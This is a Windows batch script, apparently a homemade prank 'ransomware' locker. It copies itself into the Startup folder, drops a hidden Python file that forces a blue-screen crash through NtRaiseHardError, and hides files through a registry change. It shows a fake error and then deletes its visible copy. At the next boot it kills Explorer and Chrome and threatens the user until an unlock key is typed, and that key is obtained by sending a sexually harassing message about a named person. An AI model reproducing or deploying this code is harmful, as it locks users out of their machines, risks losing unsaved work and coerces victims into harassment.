@echo off

cd C:\Users\1664783
cls
if %ERRORLEVEL% NEQ 0 (goto devcheck) else goto malicious

:malicious
::Check if the file already exists in startup
cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
if exist %~nx0 (goto code) else goto clone
cls
:clone
copy %0 "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cd C:\Users\%USERNAME%\Documents

(
echo from ctypes import windll
echo from ctypes import c_int
echo from ctypes import c_uint
echo from ctypes import c_ulong
echo from ctypes import POINTER
echo from ctypes import byref
echo nullptr = POINTER^(c_int^)^(^)
echo windll.ntdll.RtlAdjustPrivilege^(
echo c_uint^(19^), 
echo c_uint^(1^), 
echo c_uint^(0^), 
echo byref^(c_int^(^)^)
echo ^)
echo windll.ntdll.NtRaiseHardError^(
echo c_ulong^(0xC000007B^), 
echo c_ulong^(0^), 
echo nullptr, 
echo nullptr, 
echo c_uint^(6^), 
echo byref^(c_uint^(^)^)
^)
) > bsod.pyw

attrib +h bsod.pyw
cls
::OPTIONAL: DISABLE SHOW HIDDEN FILES - REMOVE REM TO ENABLE
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 2 /f
taskkill /f /im explorer.exe
start explorer.exe
::OPTIONAL: HIDE THE FILE - REMOVE REM TO ENABLE
cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
attrib +h %~nx0
::CODE TO BE RUN ONCE
if not "%1" == "max" start /MAX cmd /c %0 max & exit/b
echo Failed to compile images. (Error Code: 4b)
echo Please save uny unsaved work and reboot your computer to prevent any problems caused by the file (Failsafe A)
echo The file has been deleted. Please do not attempt to run again. (Failsafe B)
cd %~p0
pause
del %~nx0
exit

::The code of the file in startup
:code
if not "%1" == "max" start /MAX cmd /c %0 max & exit/b
taskkill /f /im explorer.exe
taskkill /f /im chrome.exe
cls
color 2
title RAGELLENA RANSOMWARE
echo ______   ___   _____  _____  _      _      _____  _   _   ___     ______   ___   _   _  _____  _____ ___  ___ _    _   ___  ______  _____ 
echo | ___ \ / _ \ |  __ \|  ___|| |    | |    |  ___|| \ | | / _ \    | ___ \ / _ \ | \ | |/  ___||  _  ||  \/  || |  | | / _ \ | ___ \|  ___|
echo | |_/ // /_\ \| |  \/| |__  | |    | |    | |__  |  \| |/ /_\ \   | |_/ // /_\ \|  \| |\ `--. | | | || .  . || |  | |/ /_\ \| |_/ /| |__  
echo |    / |  _  || | __ |  __| | |    | |    |  __| | . ` ||  _  |   |    / |  _  || . ` | `--. \| | | || |\/| || |/\| ||  _  ||    / |  __| 
echo | |\ \ | | | || |_\ \| |___ | |____| |____| |___ | |\  || | | |   | |\ \ | | | || |\  |/\__/ /\ \_/ /| |  | |\  /\  /| | | || |\ \ | |___ 
echo \_| \_|\_| |_/ \____/\____/ \_____/\_____/\____/ \_| \_/\_| |_/   \_| \_|\_| |_/\_| \_/\____/  \___/ \_|  |_/ \/  \/ \_| |_/\_| \_|\____/ 
echo ------------------------------------------------------------------------------------------------------------------------------------------
echo Attempting to close this window will result in permanent destruction of your computer!
echo ------------------------------------------------------------------------------------------------------------------------------------------
set /p "ransominput=>"                                                                                                                                                                                                   
echo Please type "RagellenaIsCanon", or enter your unlocking key.
echo On your first attempt, enter RagellenaIsCanon.
echo Input must match exactly, including capitalization. (No Quotes)
if %ransominput%==RagellenaIsCanon goto valid
if %ransominput%==raghuvirhotgaming (goto remove) else goto bsod

:valid
start explorer.exe
cls
echo Your computer has been temporarily enabled.
echo Please message Chaos on Discord or Google Chat "I LOVE RAGHU SEXUALLY" to be given an unlocking key.
echo To enter the key, reboot your computer.
echo Don't worry, you will have full access to your PC using a temporary key.
pause
exit

:remove
start explorer.exe
echo Your computer has been completely re-enabled!
pause
cd C:\Users\%USERNAME%\Documents
del bsod.pyw /q
cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
del %~nx0
exit

:bsod
cd C:\Users\%USERNAME%\Documents
start bsod.pyw
exit

:devcheck
cd C:\Users\1647622
cls
if %ERRORLEVEL% NEQ 0 goto raghu
if not "%1" == "max" start /MAX cmd /c %0 max & exit/b
title Welcome, developer.
color 2
echo Welcome, developer.
echo The temporary code is: RagellenaIsCanon
echo The permanent code is: raghuvirhotgaming
pause
exit

:raghu
cd C:\Users\1643173
cls
if %ERRORLEVEL% NEQ 0 goto markas
if not "%1" == "max" start /MAX cmd /c %0 max & exit/b
title men
color 2
echo ellena loves you!!!!!!
echo ragellena is the best ship
echo MEN
pause
exit

:markas
cd C:\Users\1651176
cls
if %ERRORLEVEL% NEQ 0 goto bystanderuninstall
if not "%1" == "max" start /MAX cmd /c %0 max & exit/b
title markas why are you here
color 2
echo how did you even get this
echo why
echo just why
echo WHYYYYYY
echo go away makus
pause
exit

:bystanderuninstall
cd %~p0
echo You are not authorized to run this file.
echo The file has been automatically deleted.
pause
del %~nx0
exit
